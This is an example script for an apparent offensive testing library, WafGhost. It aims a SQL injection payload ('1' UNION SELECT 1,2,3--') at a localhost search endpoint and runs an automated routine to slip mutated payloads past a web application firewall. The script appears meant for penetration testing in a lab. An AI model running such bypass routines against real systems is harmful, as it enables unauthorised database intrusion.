"""
Example showing basic library usage of WafGhost to probe a target
and attempt heuristic bypass mutations.
"""

import logging
import sys
from wafghost import WafBypasser

# Set up logging to stdout
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)

def run_example():
    # We will point this to a dummy endpoint or local target.
    # Note: To run this for real, replace with a test lab endpoint.
    target_url = "http://localhost:5000/search?query="
    base_payload = "1' UNION SELECT 1,2,3--"

    print(f"Initializing WafGhost for {target_url}...")
    bypasser = WafBypasser(
        target_url=target_url,
        base_payload=base_payload,
        param_name="query",
        vuln_type="sql",
        use_llm=False  # Only run rule-based heuristics
    )

    # Run the bypass routine
    result = bypasser.run()

    print("\n" + "="*40)
    print("Result Summary:")
    print(f"Bypass Successful: {result.success}")
    if result.success:
        print(f"Successful Payload: {result.payload}")
    print(f"Total Attempts Made: {result.attempts}")
    print(f"Blocked characters detected: {result.block_map.get('blocked', [])}")
    print("="*40)

if __name__ == "__main__":
    run_example()
